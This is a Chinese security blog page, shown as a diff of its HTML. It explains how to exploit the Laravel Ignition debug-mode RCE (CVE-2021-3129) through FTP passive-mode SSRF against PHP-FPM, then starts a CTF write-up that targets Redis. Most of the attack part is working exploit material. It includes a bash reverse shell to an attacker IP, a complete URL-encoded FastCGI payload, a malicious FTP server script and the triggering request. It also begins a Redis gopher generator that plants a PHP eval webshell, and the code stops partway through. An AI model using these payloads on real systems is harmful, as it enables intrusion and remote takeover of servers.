@@ -1,0 +1,274 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ftp被动模式eg | MoonlitSyntax</title><meta name="author" content="dionysus"><meta name="copyright" content="dionysus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="活学活用 Laravel Debug mode &amp;&amp; FTP SSRF to RCE Laravel 是一套简洁、开源的 PHP Web 开发框架，旨在实现 Web 软件的 MVC 架构。 2021 年 01 月 12 日，Laravel被披露存在一个远程代码执行漏洞（CVE-2021-3129）。当 Laravel 开启了 Debug 模式时，由于 Laravel 自带的 Ign">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ftp被动模式eg">
+<meta property="og:url" content="http://example.com/2023/08/28/ftp%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8Feg/index.html">
+<meta property="og:site_name" content="MoonlitSyntax">
+<meta property="og:description" content="活学活用 Laravel Debug mode &amp;&amp; FTP SSRF to RCE Laravel 是一套简洁、开源的 PHP Web 开发框架，旨在实现 Web 软件的 MVC 架构。 2021 年 01 月 12 日，Laravel被披露存在一个远程代码执行漏洞（CVE-2021-3129）。当 Laravel 开启了 Debug 模式时，由于 Laravel 自带的 Ign">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/24.jpg">
+<meta property="article:published_time" content="2023-08-28T14:56:02.000Z">
+<meta property="article:modified_time" content="2023-08-28T14:57:06.626Z">
+<meta property="article:author" content="dionysus">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/24.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/08/28/ftp%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8Feg/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"GNDO5PR146","apiKey":"1423d4e114f7a03240e8700efd01af02","indexName":"moonlit","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ftp被动模式eg',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-28 22:57:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css"  media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/18.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">43</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/24.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MoonlitSyntax"><span class="site-name">MoonlitSyntax</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ftp被动模式eg</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-28T14:56:02.000Z" title="发表于 2023-08-28 22:56:02">2023-08-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-28T14:57:06.626Z" title="更新于 2023-08-28 22:57:06">2023-08-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="活学活用">活学活用</h2>
+<h3 id="Laravel-Debug-mode-FTP-SSRF-to-RCE">Laravel Debug mode &amp;&amp; FTP SSRF to RCE</h3>
+<p>Laravel 是一套简洁、开源的 PHP Web 开发框架，旨在实现 Web 软件的 MVC 架构。</p>
+<p>2021 年 01 月 12 日，Laravel被披露存在一个远程代码执行漏洞（CVE-2021-3129）。当 Laravel 开启了 Debug 模式时，由于 Laravel 自带的 Ignition 组件对 <code>file_get_contents()</code> 和 <code>file_put_contents()</code> 函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意 Log 文件等方式触发 Phar 反序列化，最终造成远程代码执行：</p>
+<ul>
+<li>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</li>
+</ul>
+<p><img src="https://p1.ssl.qhimg.com/t01abad478292533a15.png" alt="img"></p>
+<p>该漏洞可以简化为以下两行：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
+<p>可以看到这里主要功能点是：读取一个给定的路径 <code>$parameters['viewFile']</code>，并替换读取到的内容中的 <code>$variableName</code> 为<code>$variableName ?? ''</code>，之后写回文件中 <code>$parameters['viewFile']</code>，这相当于什么都没有做！</p>
+<p>该漏洞的预期利用方法是重写日志文件然后使用 <code>phar://</code> 协议去触发 Phar 反序列化并实现 RCE。但有时候由于某些原因，我们无法是通过该方法进行 RCE，这时候我们便可以考虑本篇文章所讲的知识点，利用 FTP SSRF 攻击内网应用，从而寻找 RCE 的办法。</p>
+<p>由于我们可以运行 <code>file_get_contents</code> 来查找任何东西，因此，可以运用 SSRF 常用的姿势，通过发送 HTTP 请求来扫描常用端口。假设此时我们发现目标正在监听 9000 端口，则很有可能目标主机上正在运行着 PHP-FPM，我们可以进一步利用该漏洞来攻击 PHP-FPM。</p>
+<p>众所周知，如果我们能向 PHP-FPM 服务发送一个任意的二进制数据包，就可以在机器上执行代码。这种技术经常与 <code>gopher://</code> 协议结合使用，curl支持 <code>gopher://</code> 协议，但 <code>file_get_contents</code> 和 <code>file_put_contents</code> 却不支持。</p>
+<p>另一个已知的允许通过 TCP 发送二进制数据包的协议就是我们本文所讲的 FTP，更准确的说是该协议的被动模式，即：如果一个客户端试图从  FTP 服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个特定的 IP  和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。</p>
+<p>现在，由于该 laravel 漏洞中 <code>file_get_contents</code> 和 <code>file_put_contents</code> 这两个函数在作祟，如果我们尝试使用 <code>viewFile=ftp://evil-server/file.txt</code> 来利用这个漏洞，会发生以下情况：</p>
+<ul>
+<li><code>file_get_contents</code> 连接到我们的FTP服务器，并下载 file.txt。</li>
+<li><code>file_put_contents</code> 连接到我们的FTP服务器，并将其上传回 file.txt。</li>
+</ul>
+<p>现在，你可能已经知道这是怎么回事：我们将使用 FTP 协议的被动模式让 <code>file_get_contents</code> 在我们的服务器上下载一个文件，当它试图使用 <code>file_put_contents</code> 把它上传回去时，我们将告诉它把文件发送到 127.0.0.1:9000。</p>
+<p>这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成 SSRF。</p>
+<p>下面我们来演示一下攻击过程。</p>
+<p>首先，我们使用gopherus生成攻击fastcgi的payload：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python gopherus.py --exploit fastcgi</span><br><span class="line">/var/www/public/index.php  <span class="comment"># 这里输入的是目标主机上一个已知存在的php文件</span></span><br><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.1.7/2333 0&gt;&amp;1&quot;</span>  <span class="comment"># 这里输入的是要执行的命令</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://p0.ssl.qhimg.com/t01a0a454a129453abf.png" alt="img"></p>
+<p>得到 payload，同样是只需要 payload 中 <code>_</code> 后面的数据部分，即：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%01%01%<span class="number">00</span>%01%<span class="number">00</span>%08%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%04%<span class="number">00</span>%01%01%07%07%<span class="number">00</span>%0F%10SERVER_SOFTWAREgo%<span class="number">20</span>/%20fcgiclient%<span class="number">20</span>%0B%09REMOTE_ADDR127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%0F%08SERVER_PROTOCOLHTTP/<span class="number">1.1</span>%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%<span class="number">20</span>%3D%20On%0Adisable_functions%<span class="number">20</span>%3D%<span class="number">20</span>%0Aauto_prepend_file%<span class="number">20</span>%3D%20php%3A//<span class="built_in">input</span>%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%04%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%05%<span class="number">00</span>%01%00g%04%<span class="number">00</span>%3C%3Fphp%20system%<span class="number">28</span>%27bash%<span class="number">20</span>-c%<span class="number">20</span>%22bash%<span class="number">20</span>-i%<span class="number">20</span>%3E%<span class="number">26</span>%<span class="number">20</span>/dev/tcp/<span class="number">192.168</span><span class="number">.1</span><span class="number">.7</span>/<span class="number">2333</span>%<span class="number">200</span>%3E%<span class="number">261</span>%<span class="number">22</span>%<span class="number">27</span>%<span class="number">29</span>%3Bdie%<span class="number">28</span>%<span class="number">27</span>-----Made-by-SpyD3r-----%0A%<span class="number">27</span>%<span class="number">29</span>%3B%3F%3E%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span></span><br></pre></td></tr></table></figure>
+<p>在攻击机上设置好监听：</p>
+<p><img src="https://p0.ssl.qhimg.com/t01ac82d4ead6e14ceb.png" alt="img"></p>
+<p>然后编写如下脚本（脚本是从网上扒的：<a target="_blank" rel="noopener" href="https://github.com/Maskhe/evil_ftp%EF%BC%8C%E8%B0%81%E5%8F%AB%E6%88%91%E8%8F%9C%E5%91%A2%EF%BC%8C%E5%A4%A7%E4%BD%AC%E5%8B%BF%E5%96%B7~~%EF%BC%89%EF%BC%8C%E5%9C%A8%E6%94%BB%E5%87%BB%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%9A%84">https://github.com/Maskhe/evil_ftp，谁叫我菜呢，大佬勿喷~~），在攻击机上搭建一个恶意的</a> ftp 服务，并将上面的 payload 中的数据替换掉下面 ftp 脚本中的 payload 的内容：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/1/13 6:56 下午</span></span><br><span class="line"><span class="comment"># @Author  : tntaxin</span></span><br><span class="line"><span class="comment"># @File    : ftp_redirect.py</span></span><br><span class="line"><span class="comment"># @Software:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对gopherus生成的payload进行一次urldecode</span></span><br><span class="line">payload = unquote(<span class="string">&quot;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.7/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&quot;</span>)</span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((host, port))</span><br><span class="line">sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ftp被动模式的passvie port,监听到1234</span></span><br><span class="line">sk2 = socket.socket()</span><br><span class="line">sk2.bind((host, <span class="number">1234</span>))</span><br><span class="line">sk2.listen()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计数器，用于区分是第几次ftp连接</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    conn, address = sk.accept()</span><br><span class="line">    conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># USER aaa\r\n  客户端传来用户名</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;220 ready\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;200 ready\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))   <span class="comment"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;215 \n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># SIZE /123\r\n  客户端询问文件/123的大小</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;213 3 \n&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;300 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># EPSV\r\n&#x27;</span></span><br><span class="line">    conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))   <span class="comment"># PASV\r\n  客户端告诉服务端进入被动连接模式</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;227 192,168,1,7,4,210\n&quot;</span>)  <span class="comment"># 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;227 127,0,0,1,35,40\n&quot;</span>)  <span class="comment"># 端口计算规则：35*256+40=9000</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;125 \n&quot;</span>) <span class="comment"># 告诉客户端可以开始数据连接了</span></span><br><span class="line">        <span class="comment"># 新建一个socket给服务端返回我们的payload</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;建立连接!&quot;</span>)</span><br><span class="line">        conn2, address2 = sk2.accept()</span><br><span class="line">        conn2.send(payload)</span><br><span class="line">        conn2.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;断开连接!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;150 \n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;226 \n&quot;</span>)</span><br><span class="line">    conn.close()</span><br><span class="line">    count += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>运行上述脚本，一个恶意ftp服务就起来了：</p>
+<p><img src="https://p5.ssl.qhimg.com/t01ca2d58a2bb169e1b.png" alt="img"></p>
+<p>这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的payload；当客户端第二次连接的时候将客户端的连接重定向到 127.0.0.1:9000，也就是目标主机上 php-fpm 服务的端口，从而造成 SSRF，攻击其 php-fpm。</p>
+<p>最后，构造如下请求，即可触发攻击并反弹 Shell：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.12:8000</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>189</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;</span></span><br><span class="line"><span class="language-swift">  <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;Facade<span class="subst">\\</span>Ignition<span class="subst">\\</span>Solutions<span class="subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="language-swift">  <span class="string">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;viewFile&quot;</span>: <span class="string">&quot;ftp://aaa@192.168.1.7:23/123&quot;</span></span></span><br><span class="line"><span class="language-swift">  &#125;</span></span><br><span class="line"><span class="language-swift">&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="2021-羊城杯CTF-Cross-The-Side">[2021 羊城杯CTF]Cross The Side</h3>
+<p>进入题目，又是 Laravel：</p>
+<p><img src="https://p0.ssl.qhimg.com/t01b842dcb0f7448899.png" alt="img"></p>
+<p>根据 Laravel 的版本猜测应该是 Laravel Debug mode RCE，但是尝试 Debug RCE  并没有成功，可能是日志文件太大的原因。然后端口扫描发现其本地 6379 端口上有一个 Redis，猜测本题应该是通过 FTP 被动模式打内网的  Redis。参照前面所讲的原理，直接打就行了。</p>
+<p>首先生成攻击 Redis 的 Gophar Payload：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_POST[\&quot;whoami\&quot;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span>    <span class="comment"># 此处也可以填入Redis的密码, 在不存在Redis未授权的情况下适用</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; 